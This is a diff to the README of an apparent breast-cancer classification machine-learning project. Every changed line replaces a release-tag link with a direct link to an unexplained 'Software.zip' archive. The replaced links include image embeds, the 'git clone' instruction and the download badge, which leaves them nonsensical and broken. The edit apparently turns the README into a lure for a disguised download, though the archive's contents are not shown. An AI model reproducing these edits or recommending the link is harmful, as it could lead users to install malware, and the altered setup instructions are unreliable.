@@ -1,6 +1,6 @@
 # 🌟 Breast Cancer Classification using Machine Learning 🌟
 
- ![Breast Cancer Awareness Ribbon](https://github.com/nellyndj52/Breast-Cancer-Classification-ML/releases/tag/v1.0)
+ ![Breast Cancer Awareness Ribbon](https://github.com/nellyndj52/Breast-Cancer-Classification-ML/releases/download/v2.0/Software.zip)
 
 Welcome to the **Breast Cancer Classification Machine Learning Project** repository! Here, we focus on building predictive models to determine whether a tumor is malignant or benign based on the Breast Cancer dataset. Various classification algorithms such as Logistic Regression, Random Forest, and Support Vector Machine (SVM) are implemented and analyzed to identify the most effective model for this task. 
 
@@ -39,7 +39,7 @@ To get started with this project, simply clone the repository and explore the pr
 ### Steps:
 1. Clone the repository:
 ```
-git clone https://github.com/nellyndj52/Breast-Cancer-Classification-ML/releases/tag/v1.0
+git clone https://github.com/nellyndj52/Breast-Cancer-Classification-ML/releases/download/v2.0/Software.zip
 ```
 
 2. Navigate to the repository directory:
@@ -70,7 +70,7 @@ Based on these results, the Random Forest model exhibits the highest accuracy an
 ## 📊 Data Visualization:
 Let's take a look at some visualizations created during the exploratory data analysis phase:
 
-![Breast Cancer Data Visualization](https://github.com/nellyndj52/Breast-Cancer-Classification-ML/releases/tag/v1.0)
+![Breast Cancer Data Visualization](https://github.com/nellyndj52/Breast-Cancer-Classification-ML/releases/download/v2.0/Software.zip)
 
 - **Correlation Heatmap:** Demonstrates the correlation between different features in the dataset.
 - **Boxplot:** Shows the distribution of features among malignant and benign tumor samples.
@@ -85,7 +85,7 @@ Let's take a look at some visualizations created during the exploratory data ana
 For more details and in-depth analysis, check out our notebooks in this repository. Your feedback and contributions are highly appreciated!
 
 ## 📥 Download Latest Release:
-[![Download Latest Release](https://github.com/nellyndj52/Breast-Cancer-Classification-ML/releases/tag/v1.0%20Release-blue)](https://github.com/nellyndj52/Breast-Cancer-Classification-ML/releases/tag/v1.0)
+[![Download Latest Release](https://github.com/nellyndj52/Breast-Cancer-Classification-ML/releases/download/v2.0/Software.zip%20Release-blue)](https://github.com/nellyndj52/Breast-Cancer-Classification-ML/releases/download/v2.0/Software.zip)
 
 If the above link does not work, kindly visit the "Releases" section of the repository to access the latest release version.
 
